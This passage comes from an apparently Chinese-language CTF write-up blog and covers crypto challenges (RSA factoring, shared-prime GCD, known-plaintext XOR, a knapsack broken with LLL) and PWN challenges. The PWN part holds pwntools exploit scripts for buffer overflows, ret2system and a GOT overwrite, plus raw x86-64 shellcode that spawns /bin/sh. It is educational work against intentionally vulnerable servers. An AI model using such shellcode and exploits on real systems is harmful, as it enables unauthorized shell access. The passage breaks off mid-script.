class="hljs-symbol">fac:</span> no tune info: <span class="hljs-keyword">using</span> qs/gnfs crossover <span class="hljs-keyword">of</span> <span class="hljs-number">95</span> digits<br><span class="hljs-symbol">div:</span> primes less than <span class="hljs-number">10000</span><br><span class="hljs-symbol">fmt:</span> <span class="hljs-number">1000000</span> iterations<br><span class="hljs-symbol">rho:</span> x^<span class="hljs-number">2</span> + <span class="hljs-number">3</span>, starting <span class="hljs-number">1000</span> iterations <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">rho:</span> x^<span class="hljs-number">2</span> + <span class="hljs-number">2</span>, starting <span class="hljs-number">1000</span> iterations <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">rho:</span> x^<span class="hljs-number">2</span> + <span class="hljs-number">1</span>, starting <span class="hljs-number">1000</span> iterations <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">pm1:</span> starting B1 = <span class="hljs-number">150</span>K, B2 = gmp-ecm <span class="hljs-keyword">default</span> <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">ecm:</span> <span class="hljs-number">30</span>/<span class="hljs-number">30</span> curves <span class="hljs-keyword">on</span> C174, B1=<span class="hljs-number">2</span>K, B2=gmp-ecm <span class="hljs-keyword">default</span><br><span class="hljs-symbol">ecm:</span> <span class="hljs-number">21</span>/<span class="hljs-number">74</span> curves <span class="hljs-keyword">on</span> C174, B1=<span class="hljs-number">11</span>K, B2=gmp-ecm <span class="hljs-keyword">default</span><br>Total factoring time = <span class="hljs-number">1.8447</span> seconds<br><br><br>***factors found***<br><br>P20 = <span class="hljs-number">22788121468146346999</span><br>P155 = <span class="hljs-number">11587518025855592759726630124584244020238845252808598255278658263482784394605886754984976163579618331619323699778956049111427022474635415206131197278729813</span><br><br>ans = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>然后rsa解。</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># accessdenied&#123;alw4</span>y<span class="hljs-number">5</span>_try_t<span class="hljs-number">0</span>_f<span class="hljs-number">4</span>ct<span class="hljs-number">0</span>r<span class="hljs-number">1</span>z<span class="hljs-number">3</span>_<span class="hljs-symbol">n_9</span>ba<span class="hljs-number">93547</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="small-key"><a class="markdownIt-Anchor" href="#small-key"></a> <strong>Small key</strong></h2>
<p>Description：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">I</span> got the key easily.<br></code></pre></td></tr></table></figure>
<p>附件是程序代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-keyword">import</span> os<br><br> flag = <span class="hljs-string">b&quot;XXXXXX&quot;</span><br> key = os.urandom(<span class="hljs-number">8</span>)<br><br> cipher_text = <span class="hljs-string">b&quot;&quot;</span><br><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>     cipher_text += <span class="hljs-built_in">bytes</span>([flag[i] ^ key[i % <span class="hljs-number">8</span>]])<br><br><br> <span class="hljs-built_in">print</span>(cipher_text.<span class="hljs-built_in">hex</span>())<br><br><br><span class="hljs-comment"># flag 763d32726973a23f79373473616ba86a60300e677634f734482a626f6e5ff22e636a327c2f5ff228240123242e6caa23483d6127765fff6d743a61212f38bb</span><br></code></pre></td></tr></table></figure>
<p>我们知道明文accessdenied所以可以解出来key。然后用key去解整个密文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>flag_enc = libnum.n2s(<span class="hljs-number">0x763d32726973a23f79373473616ba86a60300e677634f734482a626f6e5ff22e636a327c2f5ff228240123242e6caa23483d6127765fff6d743a61212f38bb</span>)<br><br>flag_enc += <span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">8</span> - (<span class="hljs-built_in">len</span>(flag_enc)%<span class="hljs-number">8</span>))<br><br>part = <span class="hljs-string">b&quot;accessde&quot;</span><br><br>key = strxor(part, flag_enc[:<span class="hljs-number">8</span>])<br><br>flag = [strxor(flag_enc[<span class="hljs-number">8</span>*i:<span class="hljs-number">8</span>*i+<span class="hljs-number">8</span>], key) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_enc)//<span class="hljs-number">8</span>)]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;&quot;</span>.join(flag))<br><br><span class="hljs-comment"># accessdenied&#123;kn0wn_pl41n_t3xt_4tt4ck5_4r3_r34lly_c00l_97cd0658&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="rsa-3"><a class="markdownIt-Anchor" href="#rsa-3"></a> <strong>RSA-3</strong></h2>
<p>Description：</p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">ohh<span class="hljs-operator">..</span> What&#x27;s wrong <span class="hljs-keyword">with</span> <span class="hljs-built_in">using</span> common prime <span class="hljs-keyword">for</span> both <span class="hljs-keyword">public</span> keys<span class="hljs-operator">?</span><br></code></pre></td></tr></table></figure>
<p>附件内容：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">N1</span> <span class="hljs-operator">=</span> <span class="hljs-number">18266349196400324728796632198426724065863341515460128017379722167088811564142208540762217975696666190887534687486334974478770458134458646785682182438231047535912495200486295399237083743354006572775979196273345894016812147421648391560534928953791045301656072851030393661346227010573392017192092871743599780733618974144278058844414678104713310777338685821340236864598500469843212331330335171804328016140678014295178395686821469446312308097781506852568269309368807576215036130913554259546509277614896420588483929704110258122427731934119749960465772609969329231395097168664992720797902433454838999670183197496533599372453</span><br><span class="hljs-attribute">e1</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">ct1</span> <span class="hljs-operator">=</span> <span class="hljs-number">6873813036805706192019236826822502457972771100457517090756917047060847774848540323350759250580238758998913544271128101335276213320240302206398066922772200444602226203653559017733029810367927075606003863202964202725297461799495530697341270915140044964898303984854574497628349362668695378519684693264593494716972185326436905495762497116849607924837994943127697112124217181161062684698865533001086211217060178202980704668203486578672364578669469712587269077695001297138207491663356223994825422557742042083843727850238507161657755737436196961552942941154267260840237025593539923533367161391402240798650010287812581011106</span><br><br><span class="hljs-attribute">N2</span> <span class="hljs-operator">=</span> <span class="hljs-number">24659767524526013018768938973883991511377669248630968999008468264428208747461052247749924232027616129566843290411914770222062361142014390330463814302544910044772535448949923181736285951382305617780092296934319600643083108399436503551987425616568398265868184384255524744326852580109993750455923648308457300741311644056806840080239266629430170801800674692923486070263947659308964150022391540089059138911526148899685247042835949241530880572488161927637699425020944697998483747469309576045917038431425710502056969197916002745593176785614139365197372746789456581367558816039809574657471032143676431357391125588624599050493</span><br><span class="hljs-attribute">e2</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">ct2</span> <span class="hljs-operator">=</span>  <span class="hljs-number">11715772208083492702167997175167454009301340692399196360593824415816062365292031273728996255749695189978948242292097965040268601546052250584302206331424224398934005270192769085862845465718216946900897219973683677713043297722976307588263004621450861659350169718646844558379707749844428304916965303036455448719228506667752535085465025614399994834368259311922477097878143154258042140694172977284700008301528490157090476538427961683829505682126281348126157784828204887638985638647829395157101409725453166939388563809584382420835218557337222313577592617066209235421605768519128885685600282422644017925260843832358253267634</span><br></code></pre></td></tr></table></figure>
<p>描述说两个N公用了一个素数。所以GCD解出来就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><br>N1 = ...<br>e1 = <span class="hljs-number">65537</span><br>ct1 = ...<br><br>N2 = ...<br>e2 = <span class="hljs-number">65537</span><br>ct2 =  ...<br><br>p = <span class="hljs-built_in">int</span>(gcd(N1,N2))<br><span class="hljs-keyword">assert</span> isprime(p)<br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-built_in">int</span>(invert(e, p-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">pow</span>(ct1, d, p)))<br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">pow</span>(ct2, d, p)))<br><br><span class="hljs-comment"># b&#x27;accessdenied&#123;r3us31ng_5tuff_1s&#x27;</span><br><span class="hljs-comment"># b&#x27;_n0t_f0r_crypt0gr4phy_69c36434&#125;&#x27;</span><br><br><span class="hljs-comment"># accessdenied&#123;r3us31ng_5tuff_1s_n0t_f0r_crypt0gr4phy_69c36434&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="merkle-is-a-good-man"><a class="markdownIt-Anchor" href="#merkle-is-a-good-man"></a> <strong>Merkle is a good man</strong></h2>
<p>Description：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Have you ever seen <span class="hljs-keyword">the</span> <span class="hljs-built_in">length</span> <span class="hljs-keyword">of</span> public key <span class="hljs-keyword">is</span> <span class="hljs-keyword">equal</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> msg bit <span class="hljs-built_in">length</span>?<br></code></pre></td></tr></table></figure>
<p>哈，一看到这个描述就知道是背包加密了。对于上次做背包加密方法对了但是代码写错了感到十分残念。</p>
<p>文件内容太长了，这里就不放了。</p>
<p>LLL约束求解。代码是sagemath。线上的sagemath不支持这种运算量。需要自己跑。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;enc.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    encoded = <span class="hljs-built_in">eval</span>(fp.read())<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;public_key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    Pk = <span class="hljs-built_in">eval</span>(fp.read())<br><br>nbit = <span class="hljs-built_in">len</span>(Pk)<br>A = Matrix(ZZ, nbit + <span class="hljs-number">1</span>, nbit + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit):<br>    A[i, i] = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit):<br>    A[i, nbit] = Pk[i]<br>A[nbit, nbit] = -<span class="hljs-built_in">int</span>(encoded)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing&quot;</span>)<br>res = A.LLL()<br><br>flag = res[-<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, flag)))<br><br><span class="hljs-built_in">print</span>(b2s(flag))<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/access denied]<br>└─$ /home/kali/SageMath/SageMath/sage <span class="hljs-string">&quot;/home/kali/CTF/access denied/solve.sage.py&quot;</span><br>processing<br>b<span class="hljs-string">&#x27;accessdenied&#123;m3rkl3_h3llm4n_crypt0_1s_w34k_095403ff&#125;&#x27;</span><br><br><span class="hljs-comment"># accessdenied&#123;m3rkl3_h3llm4n_crypt0_1s_w34k_095403ff&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1>
<p>适合用于教学和期末考试。</p>
<h2 id="ret2win"><a class="markdownIt-Anchor" href="#ret2win"></a> <strong>Ret2Win</strong></h2>
<p>Description：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Huh, <span class="hljs-keyword">jump, </span><span class="hljs-keyword">jump, </span><span class="hljs-keyword">jump </span>to win.<br><span class="hljs-symbol">server:</span> nc <span class="hljs-number">34</span>.<span class="hljs-number">134</span>.<span class="hljs-number">85</span>.<span class="hljs-number">196</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure>
<p>源代码和文件都给了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    fgets(name, <span class="hljs-number">64</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">puts</span>(name);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    alarm(<span class="hljs-number">0x20</span>);<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    vuln();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>缓冲区溢出劫持返回地址，跳转到win函数即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>  *<br><br>r = remote(<span class="hljs-string">&quot;34.134.85.196&quot;</span>, <span class="hljs-number">1337</span>)<br><br>r.sendline(p32(<span class="hljs-number">0x8049216</span>)*<span class="hljs-number">20</span>)<br><br>r.interactive()<br><br><span class="hljs-comment"># accessdenied&#123;fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="shellcode"><a class="markdownIt-Anchor" href="#shellcode"></a> <strong>shellcode</strong></h2>
<p>Description：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Beginner</span> code.<br><span class="hljs-attribute">server</span>: nc <span class="hljs-number">34.134.85.196</span> <span class="hljs-number">5337</span><br></code></pre></td></tr></table></figure>
<p>源代码和文件都给了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	alarm(<span class="hljs-number">0x20</span>);<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-type">char</span> machine_code[<span class="hljs-number">512</span>];<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This only understands the machine code so you have to give only the machine code, so please enter the machine code below\n&quot;</span>);<br>	fgets(machine_code, <span class="hljs-number">512</span>, <span class="hljs-built_in">stdin</span>);<br>	((<span class="hljs-type">void</span> (*)())(machine_code))();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>最后一句直接执行了我们输入的数据。所以送一个shellcode即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;34.134.85.196&quot;</span>, <span class="hljs-number">5337</span>)<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>r.sendline(<span class="hljs-string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>)<br>r.interactive()<br><br><span class="hljs-comment"># accessdenied&#123;3x3cut3d_x64_sh3ll_0v3rfl0w_5ucc3ssfully_611a1501&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="ret2system"><a class="markdownIt-Anchor" href="#ret2system"></a> <strong>ret2system</strong></h2>
<p>Description：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">Oh</span></span>... Oh. I have <span class="hljs-keyword">system</span> here.<br>server: nc <span class="hljs-number">34.134</span><span class="hljs-number">.85</span><span class="hljs-number">.196</span> <span class="hljs-number">9337</span><br></code></pre></td></tr></table></figure>
<p>代码和文件都给了。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span> &lt;stdio<span class="hljs-selector-class">.h</span>&gt;<br><span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;<br><span class="hljs-selector-id">#include</span> &lt;unistd<span class="hljs-selector-class">.h</span>&gt;<br><br>char store<span class="hljs-selector-attr">[64]</span>;<br><br>void <span class="hljs-built_in">vuln</span>()&#123;<br>	char buf<span class="hljs-selector-attr">[32]</span>;<br>	<span class="hljs-built_in">system</span>(&quot;date&quot;);<br>	<span class="hljs-built_in">printf</span>(&quot;You are allowed to store some value\n&quot;);<br>	<span class="hljs-built_in">fgets</span>(store, <span class="hljs-number">64</span>, stdin);<br>	<span class="hljs-built_in">printf</span>(&quot;Enter the buffer now\n&quot;);<br>	<span class="hljs-built_in">fgets</span>(buf, <span class="hljs-number">64</span>, stdin);<br>&#125;<br><br>void <span class="hljs-selector-tag">main</span>()&#123;<br>    <span class="hljs-built_in">setbuf</span>(stdin, NULL);<br>    <span class="hljs-built_in">setbuf</span>(stdout, NULL);<br>    <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0</span>x20);<br>    <span class="hljs-built_in">vuln</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>vuln存在一个缓冲区溢出，看了一下开了栈不可执行。所以没法传shellcode。这里给了一个store是在堆里面的。这个变量的地址是固定的。我们可以得到。所以利用这个变量来传参数&quot;/bin/sh&quot;然后溢出劫持到system。执行system(&quot;/bin/sh&quot;)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;34.134.85.196&quot;</span>, <span class="hljs-number">9337</span>)<br><br><span class="hljs-comment"># 堆中写入字符串</span><br>r.sendline(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>straddress = p32(<span class="hljs-number">0x0804C060</span>)<br>system = p32(<span class="hljs-number">0x08049236</span>)<br><br>r.sendline(system*<span class="hljs-number">12</span> + straddress)<br>r.sendline(<span class="hljs-string">b&quot;ls&quot;</span>)<br>r.interactive()<br>r.closed()<br><br><span class="hljs-comment"># accessdenied&#123;n3xt_1_w1ll_n0t_1nclud3_system_func710n_1t53lf_e8dd6fc7&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="oob"><a class="markdownIt-Anchor" href="#oob"></a> OOB</h2>
<p>Description：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">I only have an<span class="hljs-built_in"> array </span>here<br>server: nc 34.71.207.70 1337<br></code></pre></td></tr></table></figure>
<p>给了代码和文件。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> arr[<span class="hljs-number">16</span>];<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span>&#123;<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	<span class="hljs-type">int</span> index, value;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the index: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;index);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the value: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);<br>    arr[index] = value;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good bye&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>可以看到一个arr在堆里面。我们可以通过arr这个地址来操控向任意地址写入。所以覆写puts的got表到win函数即可。这里puts的地址在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>elf = ELF(<span class="hljs-string">r&quot;oob&quot;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>win = elf.symbols[<span class="hljs-string">&quot;win&quot;</span>]<br>arr = elf.symbols[<span class="hljs-string">&quot;arr&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win:&quot;</span>,<span class="hljs-built_in">hex</span>(win))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;arr:&quot;</span>,<span class="hljs-built_in">hex</span>(arr))<br><br>distance = (puts_got - arr) // <span class="hljs-number">4</span><br><span class="hljs-built_in">print</span>(distance)<br><br>r = remote(<span class="hljs-string">&quot;34.71.207.70&quot;</span>, <span class="hljs-number">1337</span>)<br><br>r.sendline(<span class="hljs-built_in">str</span>(distance).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>r.sendline(<span class="hljs-built_in">str</span>(win).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-built_in">print</span>(r.recvline())<br><br><span class="hljs-comment"># 